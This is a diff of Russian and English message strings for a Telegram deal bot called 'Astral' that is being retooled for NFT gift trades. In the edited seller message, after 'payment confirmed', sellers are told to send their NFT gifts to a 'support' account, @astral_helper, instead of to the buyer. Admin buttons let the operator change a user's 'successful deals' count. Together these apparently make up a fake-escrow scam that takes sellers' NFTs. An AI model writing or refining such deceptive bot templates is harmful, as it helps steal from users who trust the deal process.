@@ -1,4 +1,3 @@
-
 # Тексты на русском языке
 RU_TEXTS = {
     "start_message": (
@@ -40,20 +39,20 @@ RU_TEXTS = {
     "deal_created_message": (
         "✅ Сделка успешно создана!\n\n"
         "💰 Сумма: {amount} {valute}\n"
-        "📜 Описание: {description}\n"
+        "🎁 NFT-подарок(и):\n{description}\n\n"
         "🔗 Ссылка для покупателя: {deal_link}"
     ),
     "payment_confirmed_message": (
         "✅ Оплата подтверждена для сделки #{deal_id}\n\n"
         "💰 Сумма: {amount} {valute}\n"
-        "📜 Описание: {description}\n"
+        "🎁 NFT-подарок(и):\n{description}\n\n"
         "🔗 Сделка завершена."
     ),
     "payment_confirmed_seller_message": (
         "✅ Оплата подтверждена для сделки #{deal_id}\n\n"
-        "Описание: {description}\n\n"
-        "Отправьте подарок покупателю — @{buyer_username}\n\n"
-        "⚠️ Отправляйте подарок только тому, кто указан здесь. В случае отправки подарка другому человеку возврата не будет. Обязательно записывайте на видео момент передачи."
+        "Теперь необходимо отправить NFT-подарок(и) в поддержку @astral_helper.\n\n"
+        "После того как вы полностью отправите все подарки в поддержку, "
+        "нажмите кнопку «Я отправил-(а)» под этим сообщением."
     ),
     "seller_notification_message": (
         "Пользователь @{buyer_username} присоединился к сделке #{deal_id}\n"
@@ -82,20 +81,23 @@ RU_TEXTS = {
     "admin_change_successful_deals_button": "Изменить успешные сделки",
     "admin_change_valute_button": "Изменить валюту",
     "deal_info_message": (
-        "💳 Информация о сделке #{deal_id}\n\n"
-        "👤 Вы покупатель в сделке.\n"
-        "📌 Продавец: @{seller_username}\n"
-        "• Успешные сделки: {successful_deals}\n\n"
-        "• Вы покупаете: {description}\n\n"
-        "🏦 Адрес для оплаты: {wallet}\n\n"
-        "💰 Сумма к оплате: {amount} {valute}\n"
-        "📝 Комментарий к платежу(мемо): {deal_id}\n\n"
-        "⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!\n\n"
+        "📄 Информация о сделке #{deal_id}\n\n"
+        "Вы покупатель в сделке.\n"
+        "Продавец: @{seller_username}\n"
+        "Успешные сделки: {successful_deals}\n\n"
+        "Сумма сделки: {amount} {valute}\n\n"
+        "Вы покупаете:\n"
+        "{description}\n\n"
+        "Адрес для оплаты:\n"
+        "{wallet}\n\n"
+        "Комментарий к платежу (мемо): {deal_id}\n\n"
+        "⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой.\n"
+        "Комментарий (мемо) обязателен!\n\n"
         "После оплаты ожидайте автоматического подтверждения."
     ),
     "awaiting_description_message": (
-        "📝 Укажите, что вы предлагаете в этой сделке:\n\n"
-        "`Пример: 10 Кепок и Пепе...`"
+        "🔗 Укажите ссылку или ссылки на NFT-подарок(и), которые вы продаёте в этой сделке:\n\n"
+        "`Пример: https://t.me/nft/Example-1`"
     ),
     "profile_message": (
         "👤 Профиль Astral\n\n"
@@ -148,20 +150,19 @@ EN_TEXTS = {
     "deal_created_message": (
         "✅ Deal successfully created!\n\n"
         "💰 Amount: {amount} {valute}\n"
-        "📜 Description: {description}\n"
+        "🎁 NFT gift(s):\n{description}\n\n"
         "🔗 Buyer link: {deal_link}"
     ),
     "payment_confirmed_message": (
         "✅ Payment confirmed for deal #{deal_id}\n\n"
         "💰 Amount: {amount} {valute}\n"
-        "📜 Description: {description}\n"
+        "🎁 NFT gift(s):\n{description}\n\n"
         "🔗 Deal completed."
     ),
     "payment_confirmed_seller_message": (
         "✅ Payment confirmed for deal #{deal_id}\n\n"
-        "Description: {description}\n\n"
-        "Send the gift to the buyer — @{buyer_username}\n\n"
-        "⚠️ Send the gift only to the person specified here. If you send the gift to someone else, there will be no refund. Be sure to record the moment of transfer on video."
+        "You now need to send the NFT gift(s) to the support account @astral_helper.\n\n"
+        "After you fully send all gifts to support, press the “I have sent it” button under this message."
     ),
     "seller_notification_message": (
         "User @{buyer_username} has joined the deal #{deal_id}\n"
@@ -190,20 +191,23 @@ EN_TEXTS = {
     "admin_change_successful_deals_button": "Change successful deals",
     "admin_change_valute_button": "Change currency",
     "deal_info_message": (
-        "💳 Deal information #{deal_id}\n\n"
-        "👤 You are the buyer in this deal.\n"
-        "📌 Seller: @{seller_username}\n"
-        "• Successful deals: {successful_deals}\n\n"
-        "• You are buying: {description}\n\n"
-        "🏦 Payment address: {wallet}\n\n"
-        "💰 Amount to pay: {amount} {valute}\n"
-        "📝 Payment comment (memo): {deal_id}\n\n"
-        "⚠️ Please ensure the data is correct before payment. The comment (memo) is mandatory!\n\n"
+        "📄 Deal information #{deal_id}\n\n"
+        "You are the buyer in this deal.\n"
+        "Seller: @{seller_username}\n"
+        "Successful deals: {successful_deals}\n\n"
+        "Deal amount: {amount} {valute}\n\n"
+        "You are buying:\n"
+        "{description}\n\n"
+        "Payment address:\n"
+        "{wallet}\n\n"
+        "Payment comment (memo): {deal_id}\n\n"
+        "⚠️ Please ensure the data is correct before payment.\n"
+        "The comment (memo) is mandatory!\n\n"
         "After payment, wait for automatic confirmation."
     ),
     "awaiting_description_message": (
-        "📝 Specify what you are offering in this deal:\n\n"
-        "`Example: 10 Caps and Pepe...`"
+        "🔗 Send the link or links to the NFT gift(s) you are selling in this deal:\n\n"
+        "`Example: https://t.me/nft/Example-1`"
     ),
     "profile_message": (
         "👤 Astral profile\n\n"
